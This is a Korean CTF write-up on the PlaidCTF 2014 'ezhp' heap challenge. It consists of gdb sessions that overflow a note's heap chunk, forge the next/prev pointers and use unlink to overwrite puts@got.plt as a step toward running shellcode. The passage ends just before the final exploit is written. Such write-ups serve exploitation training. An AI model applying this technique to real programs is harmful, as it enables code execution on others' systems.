## PlaidCTF 2014's pwnable problem named ezhp

``
b *0x080487F9 ==> myalloc 리턴 값을 조사하기 위해
``

```asm
.text:080487F4                 call    mymalloc
.text:080487F9                 mov     [ebp+var_C], eax
```

```
Starting program: /home/alex/hack/ctf/PCTF2014/ezhp 
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
1
Please give me a size.
128
[----------------------------------registers-----------------------------------]
EAX: 0x804c018 --> 0x0 
EBX: 0xb7fba000 --> 0x1afdbc 
ECX: 0x8c 
EDX: 0x91 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff538 --> 0xbffff568 --> 0x0 
ESP: 0xbffff510 --> 0x90 
EIP: 0x80487f9 (mov    DWORD PTR [ebp-0xc],eax)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80487ee:	mov    eax,DWORD PTR [ebp-0x10]
   0x80487f1:	mov    DWORD PTR [esp],eax
   0x80487f4:	call   0x804858b
=> 0x80487f9:	mov    DWORD PTR [ebp-0xc],eax
   0x80487fc:	mov    eax,ds:0x804a04c
   0x8048801:	mov    edx,DWORD PTR [ebp-0xc]
   0x8048804:	mov    DWORD PTR [eax*4+0x804a060],edx
   0x804880b:	mov    eax,ds:0x804a04c
[------------------------------------stack-------------------------------------]
0000| 0xbffff510 --> 0x90 
0004| 0xbffff514 --> 0xbffff528 --> 0x80 
0008| 0xbffff518 --> 0x0 
0012| 0xbffff51c --> 0x8048a46 (leave)
0016| 0xbffff520 --> 0xb7fbaa20 --> 0xfbad2a84 
0020| 0xbffff524 --> 0x8049ff4 --> 0x8049f18 --> 0x1 
0024| 0xbffff528 --> 0x80 
0028| 0xbffff52c --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x080487f9 in ?? ()
```

``gdb-peda$ x/16wx 0x804c018 ==> 할당된 주소 (헤더가 보이지 않음)``

```
0x804c018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c048:	0x00000000	0x00000000	0x00000000	0x00000000
```

``gdb-peda$ x/16wx 0x804c018-12 ==> 할당된 주소-12 (헤더가 보임)``

```
            size        next        prev
0x804c00c:	0x00000091	0x0804c09c	0x0804c000	0x00000000
0x804c01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c03c:	0x00000000	0x00000000	0x00000000	0x00000000
```

### 두 번째 node를 만듦

``gdb-peda$ x/16wx 0x804c0a8-12``

```
            size        next        prev
0x804c09c:	0x00000091	0x0804c12c	0x0804c00c	0x00000000
0x804c0ac:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0bc:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0cc:	0x00000000	0x00000000	0x00000000	0x00000000
```

### 세 번째 node를 만듦

``gdb-peda$ x/16wx 0x804c138-12``

```
            size        next        prev
0x804c12c:	0x00000091	0x0804c1bc	0x0804c09c	0x00000000
0x804c13c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c14c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c15c:	0x00000000	0x00000000	0x00000000	0x00000000
```

## 취약점 (use after free/ double free and so on)

  첫 번째 장애물 ==> 제일 앞에 놓인 node 0번의 헤더는 변경 시킬 수 없기 때문에 공격대상에서 제외

### 실험1.

  Node 1의 size를 변경하여 256바이트로 공격을 시도함.

``gdb-peda$ x/256wx 0x804c018-12 ==> 노드 0번의 시작``

```
0x804c00c:	0x00000091	0x0804c09c	0x0804c000	0x00000000
0x804c01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c06c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c07c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c08c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c09c:	0x00000091	0x0804c12c	0x0804c00c	0x41414141
0x804c0ac:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0bc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0cc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0dc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0ec:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0fc: 	0x41414141	0x41414141	0x41414141	0x41414141
0x804c10c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c11c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c12c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c13c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c14c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c15c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c16c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c17c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c18c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c19c:	0x41414141	0x41414141	0x41414141	0x00000000
```

  Node 2번 (세 번째)를 이제 지우려고 시도하면, SIGSEGV가 발생할 것임.
  
```
gdb-peda$ c
Continuing.
2
Please give me an id.
2

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41414141 ('AAAA')
EBX: 0xb7fba000 --> 0x1afdbc 
ECX: 0xb7fbb8c4 --> 0x0 
EDX: 0x41414141 ('AAAA')
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff508 --> 0xbffff538 --> 0xbffff568 --> 0x0 
ESP: 0xbffff4f8 --> 0xb7fbaa20 --> 0xfbad2a84 
EIP: 0x804873b (mov    DWORD PTR [eax+0x4],edx)
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048733:	je     0x804873e
   0x8048735:	mov    eax,DWORD PTR [ebp-0x8]
   0x8048738:	mov    edx,DWORD PTR [ebp-0x4]
=> 0x804873b:	mov    DWORD PTR [eax+0x4],edx
   0x804873e:	cmp    DWORD PTR [ebp-0x4],0x0
   0x8048742:	je     0x804874d
   0x8048744:	mov    eax,DWORD PTR [ebp-0x4]
   0x8048747:	mov    edx,DWORD PTR [ebp-0x8]
[------------------------------------stack-------------------------------------]
0000| 0xbffff4f8 --> 0xb7fbaa20 --> 0xfbad2a84 
0004| 0xbffff4fc --> 0x804c12c ('A' <repeats 124 times>)
0008| 0xbffff500 ("AAAAAAAA8\365\377\277\200\210\004\b8\301\004\b,\365\377\277")
0012| 0xbffff504 ("AAAA8\365\377\277\200\210\004\b8\301\004\b,\365\377\277")
0016| 0xbffff508 --> 0xbffff538 --> 0xbffff568 --> 0x0 
0020| 0xbffff50c --> 0x8048880 (mov    eax,DWORD PTR [ebp-0xc])
0024| 0xbffff510 --> 0x804c138 ('A' <repeats 112 times>)
0028| 0xbffff514 --> 0xbffff52c --> 0x2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0804873b in ?? ()
```

```
0x804873b:	mov    DWORD PTR [eax+0x4],edx
```

즉 [eax+0x4]에 edx를 저장하려고 보니 [0x41414141+0x4]에는 할당된 값도 없고, 

할당 되었다고 하더라도 RW권한이 없을 수도 있음.

첫 번째 장애물을 넘기기 위해서 정확히 0x41414141을 어떻게 어디로 바꾸어야 하는 지 살펴보아야 함.

### 두 번째 실험

```
gdb-peda$ x/256wx 0x804c018-12
0x804c00c:	0x00000091	0x0804c09c	0x0804c000	0x00000000
0x804c01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c06c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c07c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c08c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c09c:	0x00000091	0x0804c12c	0x0804c00c	0x41414141
0x804c0ac:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0bc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0cc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0dc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0ec:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0fc: 	0x41414141	0x41414141	0x41414141	0x41414141
0x804c10c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c11c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c12c:	0x00000091	0x0804c1bc	0x0804c09c	0x00000000
            ~~~~size    ~~~ next    ~~~ prev
```

double free는 linked list의 next/ prev를 가리키는 포인터를 조작하면서 발생하는 overflow이기 때문에
이점을 잊어서는 안됨.

`unlink()` 함수가 동작하면, 
1. 삭제되는 node의 prev->next에 삭제되는 node의 next값이 저장됨.
2. 삭제되는 node 바로 앞 (우리가 공격에 사용했던 node 1) 노드의 next->prev에 삭제되는 노드의 prev 주소를 넣음

정리하면,
1, 2에서 사용되는 삭제되는 노트의 next/ prev 주소를 우리는 공격을 통해서 변조 시킬 수 있음.
`prev->next`에 덮어써질 주소는 `puts@plt`의 주소
`next->prev`에 덮어써질 주소는 `SHELLCODE`의 주소

### 실험 3 

```
gdb-peda$ x/100wx 0x804c018-12
0x804c00c:	0x00000091	0x0804c09c	0x0804c000	0x00000000
0x804c01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c06c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c07c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c08c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c09c:	0x00000091	0x0804c12c	0x0804c00c	0x41414141
0x804c0ac:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0bc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0cc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0dc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0ec:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0fc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c10c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c11c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c12c:	0x41414141	0x42424242	0x43434343	0x00000000
                        ~~~prev     ~~~next
```

``gdb-peda$ set *0x804c130=0x0804a000``

```
gdb-peda$ x/100wx 0x804c018-12
0x804c00c:	0x00000091	0x0804c09c	0x0804c000	0x00000000
0x804c01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c06c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c07c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c08c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c09c:	0x00000091	0x0804c12c	0x0804c00c	0x41414141
0x804c0ac:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0bc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0cc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0dc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0ec:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0fc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c10c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c11c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c12c:	0x41414141	0x0804a000	0x43434343	0x00000000
                        ~~~ next    ~~~ prev
```

``gdb-peda$ set *0x804c134=0x0804c09c``

```
gdb-peda$ x/100wx 0x804c018-12
0x804c00c:	0x00000091	0x0804c09c	0x0804c000	0x00000000
0x804c01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c06c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c07c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c08c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c09c:	0x00000091	0x0804c12c	0x0804c00c	0x41414141
                        ~~~ next    ~~~ prev
0x804c0ac:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0bc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0cc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0dc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0ec:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0fc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c10c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c11c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c12c:	0x41414141	0x0804a000	0x0804c09c	0x00000000
                        ~~~ next    ~~~ prev
``

변경이 모두 완료되었으며, 이제 공격을 진행해 보자.

```
gdb-peda$ x/100wx 0x804c018-12
0x804c00c:	0x00000091	0x0804c09c	0x0804c12c	0x00000000
0x804c01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c06c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c07c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c08c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c09c:	0x00000091	0x0804a000	0x0804c00c	0x41414141
                        ~~~ next    ~~~ prev
0x804c0ac:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0bc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0cc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0dc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0ec:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c0fc:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c10c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c11c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c12c:	0x41414140	0x0804c00c	0x0804c09c	0x00000000

```

우리가 예상했던 것과 동일하게 Node 2가 삭제되면서 Node 1의 next를 자신의 next로 저장하고,
Node 1의 `next->prev`에 Node 2의 prev 값을 쓰려고 할 것이다.

(공격 성공후 `puts@got.plt`)
gdb-peda$ x/4wx 0x0804a000+8
0x804a008 <puts@got.plt>:	`0x0804c09c`	0x08048416	0x08048426	0xb7e23810

(공격 전 정상적인 `puts@got.plt`)
gdb-peda$ x/4wx 0x0804a000+8
0x804a008 <puts@got.plt>:	`0x08048406`	0x08048416	0x08048426	0xb7e23810

정확히 우리가 원하는 곳에 prev값이 저장됨을 확인 할 수 있다.
이를 통해서 exploit을 다음과 같이 작성해 보자.